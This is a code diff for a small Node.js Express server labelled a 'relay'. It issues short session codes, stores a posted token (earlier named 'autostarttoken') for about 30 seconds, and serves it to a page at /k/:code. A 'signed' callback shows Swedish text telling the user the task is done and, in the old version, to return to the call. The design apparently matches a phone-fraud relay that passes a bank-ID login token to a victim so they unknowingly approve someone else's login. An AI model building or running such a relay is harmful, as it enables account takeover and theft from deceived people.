@@ -1,101 +1,58 @@
-const express = require("express");
-const http = require("http");
-const path = require("path");
-const { WebSocketServer } = require("ws");
-
+const express = require('express');
+const path = require('path');
 const app = express();
-const server = http.createServer(app);
-const wss = new WebSocketServer({ server, path: "/ws" });
 
-app.use(express.json());
+app.use(express.text({ type: '*/*' }));
 
-const sessions = new Map();
+const S = {};
 
-function get(code) {
-    if (!sessions.has(code)) {
-        sessions.set(code, { code: code, token: null, redirect: "", state: "idle", ts: Date.now() });
-    }
-    return sessions.get(code);
+function ny() {
+  let c;
+  do { c = Math.random().toString(36).slice(2, 7).toUpperCase(); } while (S[c]);
+  return c;
 }
 
-function broadcast(code, payload) {
-    wss.clients.forEach(function (c) {
-        if (c.code === code && c.readyState === 1) {
-            try { c.send(JSON.stringify(payload)); } catch (e) {}
-        }
-    });
-}
-
-function handleToken(req, res) {
-    const body = req.body || {};
-    const code = body.code || req.query.code || "default";
-    const token = body.token || body.autostarttoken || req.query.token || null;
-    const redirect = body.redirect || req.query.redirect || "";
-    const s = get(code);
-    s.token = token;
-    s.redirect = redirect;
-    s.state = "armed";
-    s.ts = Date.now();
-    broadcast(code, { type: "token", token: s.token, redirect: s.redirect, state: "armed" });
-    res.json({ ok: true, code: code });
-}
-
-app.post("/api/token", handleToken);
-app.post("/api/push", handleToken);
-app.post("/token", handleToken);
-app.post("/push", handleToken);
-app.post("/api/relay", handleToken);
-app.post("/relay", handleToken);
-
-app.post("/api/done", function (req, res) {
-    const body = req.body || {};
-    const code = body.code || req.query.code || "default";
-    const s = get(code);
-    s.state = "done";
-    s.ts = Date.now();
-    broadcast(code, { type: "done", state: "done" });
-    res.json({ ok: true });
+app.post('/api/session', (req, res) => {
+  const c = ny();
+  S[c] = { token: '', at: 0, done: false, signed: false };
+  res.json({ ok: true, code: c });
 });
 
-app.get("/api/signed", function (req, res) {
-    const code = req.query.code || "default";
-    const s = get(code);
-    s.state = "signed";
-    s.ts = Date.now();
-    broadcast(code, { type: "signed", state: "signed" });
-    res.setHeader("Content-Type", "text/html; charset=utf-8");
-    res.send('<!doctype html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"></head><body style="font-family:sans-serif;text-align:center;padding:40px"><h2>Klart</h2><p>Ga tillbaka till samtalet.</p></body></html>');
+app.get('/api/session/:code/state', (req, res) => {
+  const s = S[req.params.code];
+  if (!s) { res.json({ ok: false }); return; }
+  const ttl = s.token ? Math.max(0, Math.round((s.at + 30000 - Date.now()) / 1000)) : 0;
+  res.json({ ok: true, token: s.token, ttl: ttl, done: s.done, signed: s.signed });
 });
 
-app.get("/api/session/:code/state", function (req, res) {
-    const s = get(req.params.code);
-    res.json({ code: s.code, state: s.state, token: s.token, redirect: s.redirect, ts: s.ts });
+app.post('/api/session/:code/token', (req, res) => {
+  let s = S[req.params.code];
+  if (!s) { s = { token: '', at: 0, done: false, signed: false }; S[req.params.code] = s; }
+  s.token = String(req.body || '').trim();
+  s.at = Date.now();
+  s.done = false;
+  s.signed = false;
+  res.json({ ok: true });
 });
 
-app.get("/k/:code", function (req, res) {
-    res.sendFile(path.join(__dirname, "public", "k.html"));
+app.post('/api/session/:code/done', (req, res) => {
+  const s = S[req.params.code];
+  if (s) s.done = true;
+  res.json({ ok: true });
 });
 
-app.get("/", function (req, res) {
-    res.sendFile(path.join(__dirname, "public", "k.html"));
+app.get('/api/signed', (req, res) => {
+  const s = S[req.query.code];
+  if (s) { s.done = true; s.signed = true; }
+  res.send('<!doctype html><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">' +
+    '<body style="font-family:sans-serif;text-align:center;padding:48px">' +
+    '<h2>Klart</h2><p>Du kan stanga sidan.</p></body>');
 });
 
-wss.on("connection", function (ws, req) {
-    const u = new URL(req.url, "http://x");
-    ws.code = u.searchParams.get("code") || "default";
-    const s = get(ws.code);
-    try {
-        ws.send(JSON.stringify({ type: "state", token: s.token, redirect: s.redirect, state: s.state }));
-    } catch (e) {}
-    ws.on("message", function (m) {
-        try {
-            const d = JSON.parse(m.toString());
-            if (d.type === "ping") ws.send(JSON.stringify({ type: "pong" }));
-        } catch (e) {}
-    });
+app.get('/k/:code', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'k.html'));
 });
 
-const PORT = process.env.PORT || 3000;
-server.listen(PORT, function () {
-    console.log("relay pa :" + PORT);
-});
+app.get('/', (req, res) => { res.send('relay ok'); });
+
+app.listen(3000, () => console.log('relay pa :3000'));
